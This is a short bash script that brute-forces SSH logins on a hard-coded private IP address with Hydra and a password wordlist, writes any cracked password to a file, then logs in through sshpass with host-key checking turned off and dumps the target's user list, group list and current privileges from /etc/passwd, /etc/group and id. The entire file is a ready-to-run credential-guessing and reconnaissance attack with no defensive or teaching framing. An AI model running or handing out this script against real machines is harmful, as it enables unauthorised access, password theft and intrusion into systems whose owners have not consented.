#!/bin/bash

# Define variables
TARGET_IP="192.168.0.51"
USERNAME="ubuntu"
WORDLIST="passwords.txt"
OUTPUT_CREDENTIALS="ssh_credentials.txt"
USER_INFO_OUTPUT="user_info.txt"

# Install required dependencies
sudo apt update && sudo apt install -y hydra sshpass

# Attempt SSH login using Hydra
echo "Starting Hydra brute force attack on $TARGET_IP with username $USERNAME..."
hydra -l $USERNAME -P $WORDLIST ssh://$TARGET_IP -t 4 -o hydra_output.txt

# Parse the Hydra output to extract valid credentials
VALID_PASSWORD=$(grep "login: $USERNAME" hydra_output.txt | awk '{print $7}')

if [ -z "$VALID_PASSWORD" ]; then
    echo "No valid credentials found. Exiting."
    exit 1
fi

# Save the username and password in a structured format
echo "Username: $USERNAME" > $OUTPUT_CREDENTIALS
echo "Password: $VALID_PASSWORD" >> $OUTPUT_CREDENTIALS
echo "Credentials saved to $OUTPUT_CREDENTIALS."

# Connect to the target machine and retrieve user, group, and privilege information
sshpass -p "$VALID_PASSWORD" ssh -o StrictHostKeyChecking=no $USERNAME@$TARGET_IP bash << 'EOF' > $USER_INFO_OUTPUT

echo "===== LIST OF USERS ====="
cut -d: -f1 /etc/passwd


echo "\n===== LIST OF GROUPS ====="
cut -d: -f1 /etc/group


echo "\n===== PRIVILEGES FOR CURRENT USER ====="
id

EOF

# Notify user
echo "User and group information retrieved. Results saved in $USER_INFO_OUTPUT."
